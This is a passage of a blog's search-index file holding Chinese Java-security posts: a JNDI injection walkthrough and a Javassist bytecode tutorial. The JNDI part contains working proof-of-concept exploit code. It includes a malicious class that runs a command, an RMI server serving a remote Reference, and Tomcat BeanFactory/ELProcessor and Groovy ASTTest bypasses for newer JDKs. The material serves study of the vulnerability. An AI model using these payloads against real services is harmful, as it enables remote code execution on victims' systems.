轻量级目录访问协议；\n- CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)；\n\n除此之外，用户还可以在 Java 官网下载其他目录服务实现。由于 SPI 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。\n\n### 使用\n**RMI**\n先起一个rmi服务端，代码忽略\n注意这里我们同样需要实现接口，并且包名和RMI Server端相同，不然会报no security manager: RMI class loader disabled错误。\n然后使用JNDI\n```java\npackage com.yyjccc.jndi.JNDI.usage;\n\nimport com.yyjccc.jndi.RMI.usage.RMIService;\n\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport java.rmi.RemoteException;\nimport java.util.Hashtable;\n\npublic class rmi {\n\tpublic static void main(String[] args) throws NamingException, RemoteException {\n\t\t//设置JNDI环境变量\n\t\tHashtable<String, String> env = new Hashtable<>();\n\t\tenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\n\t\tenv.put(Context.PROVIDER_URL, \"rmi://localhost:1099\");\n\n\n\t\tContext initContext=new InitialContext(env);\n\t\tRMIService rmiObj= (RMIService) initContext.lookup(\"myObj\");\n\t\tSystem.out.println(rmiObj.say());\n\t}\n}\n\n```\n手动设置了属性_INITIAL_CONTEXT_FACTORY_和_PROVIDER_URL_的值来对Context进行初始化。通过对Context的初始化，JNDI能够识别我们想调用何种服务，以及服务的路径。\n但实际上，在 Context#lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径\n```java\npublic static void main(String[] args) throws NamingException, RemoteException {\n\t\tContext initContext=new InitialContext();\n\t\tRMIService rmiObj= (RMIService) initContext.lookup(\"rmi://127.0.0.1:1099/myObj\");\n\t\tSystem.out.println(rmiObj.say());\n\t}\n```\n**DNS**\n```java\npackage com.yyjccc.jndi.JNDI.usage;\n\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\n\npublic class dns {\n\tpublic static void main(String[] args) throws NamingException {\n\tString url = \"dns://v8qt8d.dnslog.cn\";\n\tInitialContext initialContext = new InitialContext();\n\tinitialContext.lookup(url);\n\n\t}\n}\n\n```\n\n\n## JNDI流程\n### 上下文初始化\n以RMI不设置JNDI环境变量为例\n<img src=\"/img/4-24/2.png\" >\n可以看到若是没有设置环境变量的Context，new InitialContext的过程正是读取环境变量和设置的JNDI环境变量\n进入lookup中\n<img src=\"/img/4-24/3.png\" >\n注意到其实我们不管调用的是lookup、bind或者是其他initalContext中的方法，都会调用getURLOrDefaultInitCtx()方法进行检查\n\n跟进getURLOrDefaultInitCtx方法\n会通过getURLScheme()方法来获取通信协议，比如这里获取到的是rmi协议\n<img src=\"/img/4-24/4.png\" >\n接着跟据获取到的协议，通过NamingManager#getURLContext()来调用getURLObject()方法\n<img src=\"/img/4-24/5.png\" >\n最终在getURLObject()方法中，根据_defaultPkgPrefix_属性动态生成Factory类\n这里scheme是rmi，所以得到的类名是rmiURLContextFactory\n\n看一下JNDI默认支持那些动态协议转换。当我们针对JNDI进行攻击的时候可以优先考虑以下几种服务\n<img src=\"/img/4-24/6.png\" >\n\n通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。\n假如我们能够控制string字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行\n\n### Reference类\n该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能\n比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。\nReference类常用构造函数如下\n```java\n//className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载\n//factory为工厂类名\n//factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议\nReference(String className,  String factory, String factoryLocation) \n```\n在RMI中，由于我们远程加载的对象需要继承UnicastRemoteObject类，所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。\n```java\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport java.rmi.AlreadyBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n\npublic class jndi {\n    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {\n        String url = \"http://127.0.0.1:8080\"; \n        Registry registry = LocateRegistry.createRegistry(1099);\n        Reference reference = new Reference(\"test\", \"test\", url);\n        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);\n        registry.bind(\"aa\",referenceWrapper);\n\n\n    }\n}\n```\n## JNDI注入\n为了在命名服务或目录服务中绑定Java对象，可以使用Java序列化来传输对象，但有时候不太合适，比如Java对象较大的情况。因此JNDI定义了命名引用(Naming References)，后面直接简称引用(References)。这样对象就可以通过绑定一个可以被命名管理器(Naming Manager)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。\n\t引用由Reference类来表示，它由地址(RefAddress)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的Java类名，以及用于创建对象的ObjectFactory类的名称和位置。\nReference可以使用ObjectFactory来构造对象。当使用lookup()方法查找对象时，Reference将使用提供的ObjectFactory类的加载地址来加载ObjectFactory类，ObjectFactory类将构造出需要的对象。\n所谓的 JNDI 注入就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码，完成利用\n在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的。Reference 类表示对存在于命名/目录系统以外的对象的引用。\n\t具体则是指如果远程获取 RMI 服务器上的对象为 Reference 类或者其子类时，则可以从其他服务器上加载 class 字节码文件来实例化\n\n\n### 示例\n先写个恶意类EvilClass\n```java\nimport java.io.IOException;\n\npublic class EvilClass {\n\tstatic {\n\t\ttry {\n\t\t\tRuntime.getRuntime().exec(\"calc\");\n\t\t} catch (IOException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t}\n}\n\n```\n编写rmi服务端，使用Reference引用http上的class文件\n```java\npackage com.yyjccc.jndi.JNDI.exp;\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport java.rmi.AlreadyBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n\npublic class Refer {\n\tpublic static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {\n\t\tString url = \"http://127.0.0.1:8080/\";\n\t\tRegistry registry = LocateRegistry.createRegistry(1099);\n\t\tSystem.out.println(\"Registry start\");\n\t\tReference reference = new Reference(\"test\", \"EvilClass\", url);\n\t\tReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);\n\t\tregistry.bind(\"aa\",referenceWrapper);\n\t}\n}\n\n```\n注意new Reference的第二个参数为全类目，第三个参数为加载资源的目录\n不要搞错，可能就会出现类加载错误\n\n被攻击的客户端使用JNDI\n```java\npackage com.yyjccc.jndi.JNDI.exp;\n\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\n\npublic class Client {\n\tpublic static void main(String[] args) throws NamingException {\n\t\tContext context=new InitialContext();\n\t\tString url=\"rmi://127.0.0.1:1099/aa\";\n\t\tcontext.lookup(url);\n\n\t}\n}\n\n```\n成功弹出计算器\n<img src=\"/img/4-24/7.png\" >\n通过以上实例可以清晰的看到看到，如果lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。\nJNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示\n<img src=\"/img/4-24/8.png\" >\n\n### 原理\n为了方便远程加载字节码，就别把恶意的字节码放在项目里\n我直接使用yakit开启rmi服务\n<img src=\"/img/4-24/9.png\" >\n跟进客户端lookup方法\n在RegistryContext#lookup中\n先获得到远程对象\n<img src=\"/img/4-24/10.png\" >\n关键是后面的decodeObject对象\n<img src=\"/img/4-24/11.png\" >\n跟进decodeObject\n<img src=\"/img/4-24/12.png\" >\n首先就会判断远程对象是否为RemoteReference类型\n恰好在服务端绑定的对象为ReferenceWrapper类实例，ReferenceWrapper也是实现了RemoteReference接口\n<img src=\"/img/4-24/13.png\" >\n那么会调用远程对象的getReference方法\n进入到ReferenceWrapper类中\n<img src=\"/img/4-24/14.png\" >\ngetReference方法就是返回了所包装的Reference\n最终结果就是拿到了Reference(解开包装了)，若是其他远程对象，则没有任何变化\n继续跟进NamingManager#getObjectInstance\n若果传入的是Reference类型对象，那么就会根据Reference中的classFactory和classFactoryLocation获取factory工厂\n<img src=\"/img/4-24/15.png\" >\n继续跟进\n<img src=\"/img/4-24/16.png\" >\n首先本地加载类，找不到在使用codebase远程加载类\n跟进到VersionHelp#loadClass\n<img src=\"/img/4-24/17.png\" >\n这里创建URLClassLoader\n跟进到loadClass\n<img src=\"/img/4-24/18.png\" >\n也是到了最终的方法Class.forName加载恶意字节码，第二个参数为true，就会触发恶意字节码中的静态代码块\n## JDK高版本限制绕过\nJDK 6u132、7u122、8u113后已经默认不允许加载codebase中的远程类，如果想要根据Codebase加载位于远端服务器的类时，java.rmi.server.useCodebaseOnly的值必须为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。\n<img src=\"/img/4-24/19.png\" >\n上面高版本 JDK 中无法加载远程代码的异常出现在 com.sun.jndi.rmi.registry.RegistryContext#decodeObject 中\n其中修改代码为\n<img src=\"/img/4-24/20.png\" >\n绕过这个：\n方法一：令 ref 为空，从语义上看需要 obj 既不是\n Reference 也不是 Referenceable。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 RMI 没有操作的空间，因此这种情况不太好利用；\n方法二：令 ref.getFactoryClassLocation() 返回空。即，让 ref 对象的 classFactoryLocation 属性为空，这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键；\n方法三：直接自己本地使用命令行指定com.sun.jndi.rmi.object.trustURLCodebase 参数。\n\n\n\n\n我们可以从本地加载合适Reference Factory。\n需要注意是，该本地工厂类必须实现javax.naming.spi.ObjectFactory接口,因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对Factory类的实例对象进行了类型转换，并且该工厂类至少存在一个getObjectInstance()方法。\n\n### Tomcat8\norg.apache.naming.factory.BeanFactory就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。\norg.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。\n\n服务端和客户端都要有tomcat8依赖\n```java\n<dependency>\n    <groupId>org.apache.tomcat</groupId>\n    <artifactId>tomcat-catalina</artifactId>\n    <version>8.5.0</version>\n</dependency>\n<dependency>\n    <groupId>org.lucee</groupId>\n    <artifactId>javax.el</artifactId>\n    <version>3.0.0</version>\n</dependency>\n```\npoc\n```java\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\nimport org.apache.naming.ResourceRef;\n \nimport javax.naming.StringRefAddr;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n \npublic class RMI_Server_ByPass {\n    public static void main(String[] args) throws Exception {\n        Registry registry = LocateRegistry.createRegistry(1099);\n        ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String)null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String)null);\n        resourceRef.add(new StringRefAddr(\"forceString\", \"faster=eval\"));\n        resourceRef.add(new StringRefAddr(\"faster\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"));\n        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);\n        registry.bind(\"Tomcat8bypass\", referenceWrapper);\n        System.out.println(\"Registry运行中......\");\n \n    }\n}\n```\n\n从BeanFactory#getObjectInstance()方法看\n<img src=\"/img/4-24/21.png\" >\n首先判断我们要从工厂生成的类是否是ResourceRef类的实例，接着实例化我们指定的javax.el.ELProcessor。\nforceString可以给属性强制指定一个setter方法，这里将属性faster的setterName设置为了public java.lang.Object javax.el.ELProcessor.eval()\n<img src=\"/img/4-24/22.png\" >\n### Groovy\n在Groovy的官方文档([ASTest](http://groovy-lang.org/metaprogramming.html#xform-ASTTest))中，可以发现的是，Groovy程序允许我们执行断言，也就意味着命令执行\n@ASTTest是一种特殊的AST转换，它会在编译期对AST执行断言，而不是对编译结果执行断言。这意味着此AST转换在生成字节码之前可以访问 AST。@ASTTest可以放置在任何可注释节点上。\n因此思路和Tomcat相似，借助BeanFactory的功能，使程序执行GroovyClassLoader#parseClass，然后去解析Groovy脚本。\n需要依赖\n```java\n<dependency>\n    <groupId>org.codehaus.groovy</groupId>\n    <artifactId>groovy</artifactId>\n    <version>2.4.5</version>\n</dependency>\n```\npoc\n```java\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\nimport org.apache.naming.ResourceRef;\nimport javax.naming.NamingException;\nimport javax.naming.StringRefAddr;\nimport java.rmi.AlreadyBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n \npublic class RMI_Server_Bypass_Groovy {\n \n    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {\n        Registry registry = LocateRegistry.createRegistry(1099);\n        ResourceRef resourceRef = new ResourceRef(\"groovy.lang.GroovyClassLoader\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);\n        resourceRef.add(new StringRefAddr(\"forceString\", \"faster=parseClass\"));\n        String script = String.format(\"@groovy.transform.ASTTest(value={\\nassert java.lang.Runtime.getRuntime().exec(\\\"%s\\\")\\n})\\ndef faster\\n\", \"calc\");\n        resourceRef.add(new StringRefAddr(\"faster\",script));\n        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);\n        registry.bind(\"Groovy2bypass\", referenceWrapper);\n        System.out.println(\"Registry运行中......\");\n    }\n}\n```\n\n\n\n\n\n## Reference\n\n- [JNDI注入分析 - 跳跳糖](https://tttang.com/archive/1611/)\n- [Java安全学习——JNDI注入 - 枫のBlog](https://goodapple.top/archives/696)\n\n\n\n\n\n\n\n\n\n\n","tags":["web安全","java安全","jndi"],"categories":["java安全"]},{"title":"javassist","url":"/2024/04/12/Javassist/","content":"\n\n\n\n\n# Javassist\n\n## 介绍\n\nJavassist（Java 编程助手）使 Java 字节码操作变得简单。它是一个用于在 Java 中编辑字节码的类库。它使 Java 程序可以在运行时定义新类，并在 JVM 加载它时修改类文件。与其他类似的字节码编辑器不同，Javassist 提供了两个级别的 API：源级别和字节代码级别。如果用户使用源代码级 API，则他们可以在不了解 Java 字节码规范的情况下编辑类文件。整个 API 仅使用 Java 语言的词汇表进行设计。甚至可以以源文本的形式指定插入的字节码。Javassist 可以即时对其进行编译。另一方面，字节码级别的 API 允许用户像其他编辑器一样直接编辑类文件\n\nJavassist 是用于编辑（创建，修改）.class字节码文件的 Java 库，一般情况下我们都是在.java文件中写代码，然后编译成.class文件，在加载进 Java 虚拟机中执行代码，如果要修改已编译好的文件，要使用010 Editor去手动的计算一些偏移值进行修改，但是 Javassist 的出现，使得我们操作.class文件变得简单，并且可以在 Java 虚拟机 JVM 运行时动态地改变.class文件\n\n依赖\n```xml\n<dependencies>\n  <dependency>\n    <groupId>org.javassist</groupId>\n    <artifactId>javassist</artifactId>\n    <version>3.27.0-GA</version>\n  </dependency>\n</dependencies>\n```\n\n## 基本概念\nJavassist 是一个开源的分析、编辑和创建Java字节码的类库. 其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类.\nJavassist中最为重要的是ClassPool,CtClass, CtMethod以及CtField这几个类.\n\n- ClassPool: 一个基于Hashtable实现的CtClass对象容器, 其中键是类名称, 值是表示该类的CtClass对象\n- CtClass: CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得\n- CtMethods: 表示类中的方法\n- CtFields: 表示类中的字段\n\n使用示例：\n```java\nimport javassist.*;\n \nimport java.io.IOException;\n \npublic class Javasist_Learning {\n    public static void Create_Person() throws NotFoundException, CannotCompileException, IOException {\n \n        //获取CtClass 对象的容器 ClassPool\n        ClassPool pool = ClassPool.getDefault();\n \n        //创建一个新类Javasist.Learning.Person\n        CtClass ctClass = pool.makeClass(\"Javasist.learning.Person\");\n \n        //创建一个类属性name\n        CtField ctField1 = new CtField(pool.get(\"java.lang.String\"),\"name\",ctClass);\n        //设置属性访问符\n        ctField1.setModifiers(Modifier.PRIVATE);\n        //将name属性添加进Person中，并设置初始值为Feng\n        ctClass.addField(ctField1,CtField.Initializer.constant(\"Feng\"));\n \n        //向Person类中添加setter和getter\n        ctClass.addMethod(CtNewMethod.setter(\"setName\",ctField1));\n        ctClass.addMethod(CtNewMethod.getter(\"getName\",ctField1));\n \n        //创建一个无参构造\n        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);\n        //设置方法体\n        constructor.setBody(\"{name = \\\"Feng\\\";}\");\n        //向Person类中添加该无参构造\n        ctClass.addConstructor(constructor);\n \n        //创建一个类方法printName\n        CtMethod ctMethod = new CtMethod(CtClass.voidType,\"printName\",new CtClass[]{},ctClass);\n        //设置方法访问符\n        ctMethod.setModifiers(Modifier.PRIVATE);\n        //设置方法体\n        ctMethod.setBody(\"{System.out.println(name);}\");\n        //将该方法添加进Person中\n        ctClass.addMethod(ctMethod);\n \n        //将生成的字节码写入文件\n        ctClass.writeFile(\"C:\\\\Users\\\\34946\\\\Desktop\\\\安全学习\\\\ROME\\\\\");\n \n    }\n \n    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {\n        Create_Person();\n    }\n}\n```\n### ClassPool的相关方法\n\n- getDefault: 返回默认的ClassPool是单例模式的，一般通过该方法创建我们的ClassPool；\n- appendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；\n- toClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；\n- get , getCtClass: 根据类路径名获取该类的CtClass对象，用于后续的编辑。\n```java\n// 获取ClassPool对象, 使用系统默认类路径\nClassPool pool = new ClassPool(true);\n// 效果与 new ClassPool(true) 一致\nClassPool pool1 = ClassPool.getDefault();\n\n```\n为减少ClassPool可能导致的内存消耗. 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象.\n```java\n// 从ClassPool中删除CtClass对象\nctClass.detach();\n// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出\nClassPool pool2 = new ClassPool(true);\n```\n\n### CtClass的相关方法\n\n- freeze: 冻结一个类，使其不可修改；\n- isFrozen : 判断一个类是否已被冻结；\n- prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；\n- defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；\n- detach : 将该class从ClassPool中删除；\n- writeFile : 根据CtClass生成 .class 文件；\n- toClass : 通过类加载器加载该CtClass。\n- setInterfaces: 添加父接口\n- setSuperclass: 添加父类\n#### 常用方法\n```java\n//更改超类，除非此对象表示接口。\nvoid\tsetSuperclass(CtClass clazz)\n\n//将此类转换为java.lang.Class对象。\njava.lang.Class<?>\ttoClass(java.lang.invoke.MethodHandles.Lookup lookup)\t\n    \n//将该类转换为类文件。\nbyte[]\ttoBytecode()\t\n\n//将由此CtClass 对象表示的类文件写入当前目录。\nvoid\twriteFile()\t\n\n//将由此CtClass 对象表示的类文件写入本地磁盘。\nvoid\twriteFile(java.lang.String directoryName)\t\n\n//在当前类中创建了一个静态代码块\nCtConstructor\tmakeClassInitializer()\t\n```\n#### 获取CtClass\n```java\n// 通过类名获取 CtClass, 未找到会抛出异常\nCtClass ctClass = pool.get(\"com.kawa.ssist.JustRun\");\n// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常\nCtClass ctClass1 = pool.getOrNull(\"com.kawa.ssist.JustRun\");\n\n```\n#### 创建CtClass\n```java\n// 复制一个类\nCtClass ctClass2 = pool.getAndRename(\"com.kawa.ssist.JustRun\", \"com.kawa.ssist.JustRunq\");\n// 创建一个新类\nCtClass ctClass3 = pool.makeClass(\"com.kawa.ssist.JustRuna\");\n// 通过class文件创建一个新类\nCtClass ctClass4 = pool.makeClass(new FileInputStream(new File(\"/home/un/test/JustRun.class\")));\n\n```\n#### CtClass基础信息\n```java\n// 类名\nString simpleName = ctClass.getSimpleName();\n// 类全名\nString name = ctClass.getName();\n// 包名\nString packageName = ctClass.getPackageName();\n// 接口\nCtClass[] interfaces = ctClass.getInterfaces();\n// 继承类\nCtClass superclass = ctClass.getSuperclass();\n// 获取类方法\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"getName()\", new CtClass[] {pool.get(String.class.getName()), pool.get(String.class.getName())});\n// 获取类字段\nCtField ctField = ctClass.getField(\"name\");\n// 判断数组类型\nctClass.isArray();\n// 判断原生类型\nctClass.isPrimitive();\n// 判断接口类型\nctClass.isInterface();\n// 判断枚举类型\nctClass.isEnum();\n// 判断注解类型\nctClass.isAnnotation();\n// 冻结一个类，使其不可修改\nctClass.freeze () \n// 判断一个类是否已被冻结\nctClass.isFrozen()\n// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用\nctClass.prune() \n//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法\nctClass.defrost()\n\n```\n#### CtClass类操作\n```java\n// 添加接口\nctClass.addInterface(...);\n// 添加构造器\nctClass.addConstructor(...);\n// 添加字段\nctClass.addField(...);\n// 添加方法\nctClass.addMethod(...);\n```\n#### CtClass类编译\n```java\n// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class\nClass clazz = ctClass.toClass();\n// 类的字节码文件\nClassFile classFile = ctClass.getClassFile();\n// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常\nbyte[] bytes = ctClass.toBytecode();\n```\n\n### CtMethod的相关方法\n上面我们创建一个新的方法使用了CtMethod类。CtMthod代表类中的某个方法，可以通过CtClass提供的API获取或者CtNewMethod新建，通过CtMethod对象可以实现对方法的修改。\n\n- insertBefore : 在方法的起始位置插入代码；\n- insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；\n- insertAt : 在指定的位置插入代码；\n- setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；\n- make : 创建一个新的方法。\n\n#### 获取CtMethod属性\n```java\nCtClass ctClass5 = pool.get(TestService.class.getName());\nCtMethod ctMethod = ctClass5.getDeclaredMethod(\"selectOrder\");\n// 方法名\nString methodName = ctMethod.getName();\n// 返回类型\nCtClass returnType = ctMethod.getReturnType();\n// 方法参数, 通过此种方式得到方法参数列表\n// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)\nctMethod.getLongName();\n// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;\nctMethod.getSignature();\n\n// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称\nList<String> argKeys = new ArrayList<>();\nMethodInfo methodInfo = ctMethod.getMethodInfo();\nCodeAttribute codeAttribute = methodInfo.getCodeAttribute();\nLocalVariableAttribute attr = (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);\nint len = ctMethod.getParameterTypes().length;\n// 非静态的成员函数的第一个参数是this\nint pos = Modifier.isStatic(ctMethod.getModifiers()) ? 0 : 1;\nfor (int i = pos; i < len; i++) {\n    argKeys.add(attr.variableName(i));\n}\n```\n#### CtMethod方法体修改\n```java\n// 在方法体前插入代码块\nctMethod.insertBefore(\"\");\n//设置方法体\n public void setBody(String src);\n// 在方法体后插入代码块\nctMethod.insertAfter(\"\");\n// 在某行 字节码 后插入代码块\nctMethod.insertAt(10, \"\");\n// 添加参数\nctMethod.addParameter(CtClass);\n// 设置方法名\nctMethod.setName(\"newName\");\n// 设置方法体 $0=this / $1,$2,$3... 代表方法参数\nctMethod.setBody(\"{$0.name = $1;}\");\n//创建一个新的方法\nctMethod.make(\"kawa\",CtClass);\n```\n#### 异常块 addCatch()\n在方法中加入try catch块, 需要注意的是, 必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束\n```java\nCtMethod m = ...;\nCtClass etype = ClassPool.getDefault().get(\"java.io.IOException\");\nm.addCatch(\"{ System.out.println($e); throw $e; }\", etype);\n// 等同于添加如下代码: \ntry {\n    // the original method body\n} catch (java.io.IOException e) {\n    System.out.println(e);\n    throw e;\n}\n```\n\n### CtConstructor\nCtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数（类初始化器）。可以通过CtConstructor.make方法创建\n#### 常用方法\n```\n//设置构造函数主体。\nvoid\tsetBody(java.lang.String src)\t\n\n//从另一个构造函数复制一个构造函数主体。\nvoid\tsetBody(CtConstructor src, ClassMap map)\t\n\n//复制此构造函数并将其转换为方法。\nCtMethod\ttoMethod(java.lang.String name, CtClass declaring)\n```\n\n## 类搜索路径\n  通过ClassPool.getDefault()获取的ClassPool使用 JVM 的类搜索路径。如果程序运行在JBoss或者Tomcat等 Web 服务器上，ClassPool可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。\n```java\n//默认加载方式如pool.insertClassPath(new ClassClassPath(this.getClass()));\nClassPool pool = ClassPool.getDefault();\n//从file加载classpath\npool.insertClassPath(\"/usr/local/javalib\")\n//从URL中加载\nClassPath cp = new URLClassPath(\"www.javassist.org\", 80, \"/java/\", \"org.javassist.\");\npool.insertClassPath(cp);\n//从byte[] 中加载\nbyte[] b = a byte array;\nString name = class name;\ncp.insertClassPath(new ByteArrayClassPath(name, b));\n//可以从输入流中加载class\nInputStream ins = an input stream for reading a class file;\nCtClass cc = cp.makeClass(ins);\n```\n**通过ClassClassPath添加搜索路径**\n```java\npool.insertClassPath(new ClassClassPath(Person.getClass()));\n\n// 将classpath插入到指定classpath之前\npool.insertClassPath(new ClassClassPath(this.getClass()));\n// 将classpath添加到指定classpath之后\npool.appendClassPath(new ClassClassPath(this.getClass()));\n// 将一个目录作为classpath\npool.insertClassPath(\"/xxx/lib\");\n```\n上面的语句将Person类添加到pool的类加载路径中。但在实践中，我发现通过这个可以将Person类所在的整个jar包添加到类加载路径中。\n**通过ByteArrayPath添加搜索路径**\n```java\nClassPool cp = ClassPool.getDefault();\nbyte[] buf = 字节数组;\nString name = 类名;\ncp.insertClassPath(new ByteArrayClassPath(name, buf));\nCtClass cc = cp.get(name);\n```\n示例中的 CtClass 对象是字节数据buf代表的class文件。将对应的类名传递给ClassPool的get()方法，就可以从字节数组中读取到对应的类文件。\n**通过URL指定搜索路径**\n```java\nClassPool pool = ClassPool.getDefault();\nClassPath cp = new URLClassPath(\"www.sample.com\", 80, \"/out/\", \"com.test.\");\npool.insertClassPath(cp);\n```\n上述代码将[http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索](http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2) com.test包里面的类。例如，为了加载 com.test.Person，它的类文件会从获取http://www.sample.com:80/out/com/test/Person.class获取\n**通过输入流加载class**\n如果你不知道类的全名，可以使用makeClass()方法：\n```java\nClassPool cp = ClassPool.getDefault();\nInputStream ins =  class文件对应的输入流;\nCtClass cc = cp.makeClass(ins);\n```\nmakeClass()返回从给定输入流构造的CtClass对象。你可以使用makeClass()将类文件提供给ClassPool对象。如果搜索路径包含大的jar文件，这可能会提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每个类文件。makeClass()可以用于优化此搜索。由makeClass()构造的CtClass保存在ClassPool对象中，从而使得类文件不会再被读取。\n\n## 读写字节码\nJavassist是用来处理java字节码的类库， java字节码一般存放在后缀名称为class的二进制文件中。每个二进制文件都包含一个java类或者是java接口。\nJavasist.CtClass是对类文件的抽象，处于编译中的此对象可以用来处理类文件。下面的代码用来展示一下其简单用法：\n```java\nClassPool pool = ClassPool.getDefault();\nCtClass cc = pool.get(\"test.Rectangle\");\ncc.setSuperclass(pool.get(\"test.Point\"));\ncc.writeFile();\n```\n\n这段程序首先获取ClassPool的实例，它主要用来修改字节码的，里面存储着基于二进制文件构建的CtClass对象，它能够按需创建出CtClass对象并提供给后续处理流程使用。当需要进行类修改操作的时候，用户需要通过ClassPool实例的.get()方法，获取CtClass对象。从上面代码中我们可以看出，ClassPool的getDefault()方法将会查找系统默认的路径来搜索test.Rectable对象，然后将获取到的CtClass对象赋值给cc变量。\n\n    